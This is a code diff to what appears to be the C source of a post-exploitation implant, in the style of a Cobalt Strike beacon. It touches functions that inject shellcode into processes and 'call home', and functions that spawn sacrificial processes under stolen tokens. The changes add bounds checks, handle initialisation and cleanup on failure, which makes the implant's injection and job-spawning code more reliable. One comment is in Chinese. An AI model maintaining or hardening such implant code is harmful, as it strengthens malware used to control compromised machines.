@@ -192,6 +192,11 @@ void command_spawnas(char * buffer, int length, BOOL x86) {
 void command_inject_ping(char * buffer, int length, BOOL x86, void(*cb)(char * buffer, int length, int type)) {
 	unsigned short port = 0;
 
+	/* 任务载荷至少含 2 字节端口；不足时直接放弃（负 length 传入注入链会
+	   以 (size_t) 负数参与 memcpy） */
+	if (length < (int)sizeof(unsigned short))
+		return;
+
 	/* extract our port value */
 	memcpy((void *)&port, buffer, sizeof(unsigned short));
 	buffer += sizeof(unsigned short);
@@ -209,6 +214,9 @@ void command_inject_ping(char * buffer, int length, BOOL x86, void(*cb)(char * b
 /* inject shellcode and then call home to indicate it was done */
 void command_inject_pid_ping(char * buffer, int length, void(*cb)(char * buffer, int length, int type), BOOL x86) {
 	unsigned short port = 0;
+
+	if (length < (int)sizeof(unsigned short))
+		return;
 
 	/* extract our port value */
 	memcpy((void *)&port, buffer, sizeof(unsigned short));
@@ -233,6 +241,9 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	/* drop our token */
 	token_guard_start_maybe(ignoreToken);
 
+	newstdout   = INVALID_HANDLE_VALUE;
+	read_stdout = INVALID_HANDLE_VALUE;
+
 	/* reset some stuff */
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
@@ -244,7 +255,10 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	sa.bInheritHandle = TRUE;
 
 	/* we're going to setup an stdout pipe only */
-	CreatePipe(&read_stdout, &newstdout, &sa, 1024 * 1024);
+	if (!CreatePipe(&read_stdout, &newstdout, &sa, 1024 * 1024)) {
+		token_guard_stop_maybe(ignoreToken);
+		return;
+	}
 
 	/* further process our startup info data structure */
 	GetStartupInfo(&si);
@@ -256,6 +270,8 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 
 	/* do our spawn logic, please! */
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
+		CloseHandle(read_stdout);
+		CloseHandle(newstdout);
 		token_guard_stop_maybe(ignoreToken);
 		return;
 	}
